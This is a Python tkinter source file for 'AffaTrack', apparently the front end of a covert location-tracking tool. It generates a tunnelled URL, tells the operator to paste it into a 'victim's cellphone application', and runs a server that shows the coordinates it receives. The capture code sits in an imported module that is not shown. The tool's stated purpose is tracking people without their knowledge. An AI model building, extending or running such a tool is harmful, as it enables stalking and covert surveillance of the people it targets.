import tkinter as tk
from tkinter import *
from tkinter import ttk
import sys
import threading
import server
import requests
import time
from server import HTTPServerWrapper
from portScanning import portScanning
from settings import config



#openTunnel = True
configP = config()






class mainInterface():
    def run_main_interface(self):

        def start_server_wind():
            mainWind.withdraw()
            newServerWind = tunnel_creator_interface()
            newServerWind.run_tunnel_creator_interface()

        def start_settings_wind():
            mainWind.withdraw()
            newSettingsWInd = settings_interface()
            newSettingsWInd.run_settings_interface()

        def exitProgram():
            sys.exit()

        mainWind = tk.Tk()
        mainWind.title("AffaTrack main")
        mainWind.geometry("800x500")
        mainWind.configure(bg="black")
        title = tk.Label(mainWind, 
            text="AffaTrack",
            bg="black", 
            fg="red", 
            font=("Helvetica",40,"bold"), 
            anchor="center"
            ).pack(side="top", fill="both", anchor="n",pady=10)

        
        serverButton = Button(mainWind, 
            text="Generate URL", 
            width=20 , 
            bg="#999595", fg="black",
            command=start_server_wind
            ).pack(pady=30)
        

                
        settingsButton = Button(mainWind, 
            text="Server Settings", 
            width=20 , 
            bg="#999595", fg="black",
            command=start_settings_wind
            ).pack(pady=30)

        exitButton = Button(mainWind, 
            text="Exit", 
            width=20 , 
            bg="#999595", fg="black",
            command=exitProgram
            ).pack(pady=30)
        


        mainWind.mainloop()



class tunnel_creator_interface():
    def run_tunnel_creator_interface(self):

        def start_menu_interface():
            tunnelWind.destroy()
            mainWindow = mainInterface()
            mainWindow.run_main_interface()


        def stopTunnelUrl(new_url,http_tunel, show_generated_url, stopTunnelButton, startServerButton ):
            new_url.stop_http_tunnel(http_tunel) #objeto new_url llama al metodo stop_http_tunnel para cerra el tunel
            startServerButton.destroy()         
            generating_url_message.config(text="The tunnel has been closed")
            show_generated_url.destroy()
            stopTunnelButton.config(
                text="Menu",
                command=start_menu_interface
            )
            configP.serverRunning = False





        def generate_url(host,port,protocol):



            new_url = server.http_tunnel(host,port,protocol)
            url, http_tunel = new_url.start_http_tunnel()
            progress_bar.stop()
            progress_bar.destroy()
            generating_url_message.config(text="Copy and paste this URL into your victim's cellphone application.")
            show_generated_url = Text(tunnelWind, height=10, width=50)
            show_generated_url.pack(pady=20)
            show_generated_url.insert(tk.END, url)
            
            startServerButton = Button(tunnelWind, 
                text="Start Server", 
                width=20,
                bg="#999595", 
                fg="black",
                command=lambda: start_server_interface(url,startServerButton)
            )
            startServerButton.pack(pady=15)

            stopTunnelButton = Button(tunnelWind, 
                text="Stop Tunnel", 
                width=20,
                bg="#999595", 
                fg="black",
                command= lambda: stopTunnelUrl(new_url,http_tunel,show_generated_url, stopTunnelButton, startServerButton)
            )
            hilo = threading.current_thread()
            print(hilo)
            stopTunnelButton.pack(pady=15)

        def start_server_interface(url,startServerButton):
            if not configP.serverRunning:
                newServerWind = server_listening_interface(url)
                newServerWind.run_server_interface()

            else:
                pass


        def start_generating_thread_url(host,port,protocol):

            
            url_thread = threading.Thread(target= lambda:generate_url(host,port,protocol))
            url_thread.start()



        tunnelWind = tk.Tk()    

        tunnelWind.title("AffaTrack main")
        tunnelWind.geometry("800x500")
        tunnelWind.configure(bg="black")
        title = tk.Label(tunnelWind, 
            text="AffaTrack",
            bg="black", 
            fg="red", 
            font=("Helvetica",40,"bold"), 
            anchor="center"
            ).pack(side="top", fill="both", anchor="n",pady=10)
        
        
        generating_url_message = tk.Label(tunnelWind,
            text="Generando url...",
            bg = "black",
            fg = "white",
            font=15,
            anchor="center",
  
        )
        generating_url_message.pack(fill="both",anchor="n", pady=20,)

        progress_bar = ttk.Progressbar(tunnelWind, orient="horizontal", length=500, mode="indeterminate")
        progress_bar.pack(pady=20)
        progress_bar.start()

        if config.defaultTunnelSettingsFlag == True:
            start_generating_thread_url(**configP.defaultTunnelSettings)
        else:
            start_generating_thread_url(**configP.customedTunnelSettings)

        


        tunnelWind.mainloop()
class server_listening_interface():
    def __init__(self, url):
        self.url = url
        self.server_instance = None  

    def run_server_interface(self):
        configP.serverRunning = True
        def start_http_server(host, port, widget):
            self.server_instance = HTTPServerWrapper(host, port)  
            self.server_instance.run(widget)


        def verify_active_url(url):
            try:
                response = requests.get(url)
                print(f"Verificando URL: {url}, Codigo de estados: {response.status_code}")
                if response.status_code == 200:
                    return True
            except requests.ConnectionError as e:
                print("Conexión rechazada:", e)
            return False


        def close_window_case_url_false(root, url, message1):
            while True:
                if not verify_active_url(url):
                    message1.config(text='The tunnel has been closed.')
                    root.destroy()
                    break
                time.sleep(20)

        if config.defaultServerSettingsFlag == True:
            serverWind = tk.Tk()
            serverWind.title("AffaTrack HTTP server listening..")
            serverWind.geometry("800x700")
            serverWind.configure(bg="black")

            serverHost = configP.defaultServerSettings['host']
            serverPort = configP.defaultServerSettings['port']

          
            title = tk.Label(serverWind, text="AffaTrack", bg="black", fg="red", font=("Helvetica", 40, "bold"), anchor="center")
            title.pack(side="top", fill="both", anchor="n", pady=10)
            message1 = Label(serverWind, text="Server listening on {}, port: {} ...".format(serverHost, int(serverPort)),
                                 bg="black", fg="white", font=15, anchor="center")
            message1.pack(pady=20)

            coordinatesWidgetPrints = Text(serverWind, height=20, width=80)
            coordinatesWidgetPrints.pack(pady=5)
            server_manager_thread = threading.Thread(target=lambda: start_http_server(serverHost, int(serverPort), coordinatesWidgetPrints))
            server_manager_thread.start()

            if verify_active_url(self.url):
                stop_server_button = Button(serverWind, text="Stop Server",
                    width=20 , 
                    bg="#999595", fg="black", 
                     command=lambda: self.stop_server(serverWind)
                )
                stop_server_button.pack(pady=20)
                ngrok_monitor_thread = threading.Thread(target=close_window_case_url_false, args=(serverWind, self.url, message1))
                ngrok_monitor_thread.daemon = True
                ngrok_monitor_thread.start()
                serverWind.mainloop()
        else:
            serverWind = tk.Tk()
            serverWind.title("AffaTrack HTTP server listening..")
            serverWind.geometry("800x700")
            serverWind.configure(bg="black")

            serverHost = configP.customedServerSettings['host']
            serverPort = configP.customedServerSettings['port']

            
            title = tk.Label(serverWind, text="AffaTrack", bg="black", fg="red", font=("Helvetica", 40, "bold"), anchor="center")
            title.pack(side="top", fill="both", anchor="n", pady=10)
            message1 = Label(serverWind, text="Server listening on {}, port: {} ...".format(serverHost, int(serverPort)),
                                 bg="black", fg="white", font=15, anchor="center")#error en config.customed.....
            message1.pack(pady=20)

            coordinatesWidgetPrints = Text(serverWind, height=20, width=80)
            coordinatesWidgetPrints.pack(pady=5)

            server_manager_thread = threading.Thread(target=lambda: start_http_server(serverHost, int(serverPort), coordinatesWidgetPrints))
            server_manager_thread.start()

            if verify_active_url(self.url) :
            
                stop_server_button = Button(serverWind, text="Stop Server",
                    width=20 , 
                    bg="#999595", fg="black", 
                     command=lambda: self.stop_server(serverWind)
                )
                stop_server_button.pack(pady=20)

                ngrok_monitor_thread = threading.Thread(target=close_window_case_url_false, args=(serverWind, self.url, message1))
                ngrok_monitor_thread.daemon = True
                ngrok_monitor_thread.start()

                serverWind.mainloop()


    def stop_server(self, serverWind):
        serverWind.destroy()
        if self.server_instance :
            self.server_instance.stop()
            configP.serverRunning = False
        else:
            print("No server instance to stop.")
            


class settings_interface():

    def run_settings_interface(self):

        def start_main_interface():
            settingsWind.destroy()
            mainWindow = mainInterface()
            mainWindow.run_main_interface()

        def reset_settings():
            config.defaultServerSettingsFlag = True
            config.defaultTunnelSettingsFlag = True
            errorLabel.config(
                text="Default settings",
                bg="green"
            )
            errorLabel.grid(column=1,row=7)
            serverPortEntrySpace.delete(0, tk.END)
            tunnelPortEntrySpace.delete(0, tk.END)
            settingsWind.destroy()
            mainWindow = mainInterface()
            mainWindow.run_main_interface()


        settingsWind = tk.Tk()
        
        settingsWind.title("AffaTrack Settings")
        settingsWind.geometry("800x500")
        settingsWind.configure(bg="black")
        settingsWind.grid_columnconfigure(0, weight=1)
        settingsWind.grid_columnconfigure(1, weight=1)
        settingsWind.grid_columnconfigure(2, weight=1)
    
        title = tk.Label(settingsWind, text="AffaTrack", bg="black", fg="red", font=("Helvetica", 40, "bold"), anchor="center")
        title.grid(column=0, row=0, columnspan=3, pady=10, sticky="n")

        tunnelPortLabel =Label(settingsWind,
            text="TUNNEL PORT",
            font=15,
            fg="white",
            bg="black"
        )
        tunnelPortLabel.grid(column=0,row=2,pady=10,padx=33)
        tunnelPortEntrySpace = Entry(settingsWind,width=10)
        tunnelPortEntrySpace.grid(column=0,row=3,pady=5)

        serverPortLabel =Label(settingsWind,
            text="SERVER PORT",
            font=15,
            fg="white",
            bg="black"
        )
        serverPortLabel.grid(column=2,row=2,pady=10,padx=33)
        serverPortEntrySpace = Entry(settingsWind,width=10)
        serverPortEntrySpace.grid(column=2,row=3,pady=5)

        saveSettingsButton = Button(settingsWind,
            text="Save Settings",
            width=20,
            bg="#999595", 
            fg="black",
            command=lambda: verifyNewSettings(tunnelPortEntrySpace, serverPortEntrySpace)
        )
        saveSettingsButton.grid(column=1,row=5,pady=15)
        resetDefaultSettingsButton = Button(settingsWind,
            text="Default Settings",
            width=20,
            bg="#999595", 
            fg="black",
            command=reset_settings
        )
        resetDefaultSettingsButton.grid(column=0,row=5,pady=15)

        cancelButton = Button(settingsWind,
            text="Cancel",
            width=20,
            bg="#999595", 
            fg="black",
            command=start_main_interface
        )
        cancelButton.grid(column=2,row=5,pady=15)
        errorLabel = Label(settingsWind,
            text="Error",
            width=20,
            bg="red", 
            fg="black"
        )

        def verifyNewSettings(tunnelPortEntrySpace, serverPortEntrySpace):

            if tunnelPortEntrySpace.get() and serverPortEntrySpace.get():

                if tunnelPortEntrySpace.get() == serverPortEntrySpace.get() and int(tunnelPortEntrySpace.get())<65535 and int(tunnelPortEntrySpace.get())>0:
                    try:
                        localPorts = []
                        newLocalPorts = portScanning()
                        localPorts = newLocalPorts.scan_open_ports()
                        givenPort = serverPortEntrySpace.get() 
                        if int(givenPort) in localPorts:
                            errorLabel.config(
                                text="The port is already in use"
                            )
                            errorLabel.grid(column=1, row=6)
                        else:
                            settingsWind.destroy()
                            configP.customedServerSettings["port"] = givenPort
                            configP.customedTunnelSettings["port"] = givenPort
                            config.defaultServerSettingsFlag = False
                            config.defaultTunnelSettingsFlag = False
                            mainWindow = mainInterface()
                            mainWindow.run_main_interface()


                    except Exception as e:
                        errorLabel.config(
                            text=e
                        )
                        print(e)
                        errorLabel.grid(column=1, row=6)
                else:
                    errorLabel.grid(column=1, row=6)
            else:
                errorLabel.grid(column=1, row=6)
        


    
        settingsWind.mainloop()


window = mainInterface()
window.run_main_interface()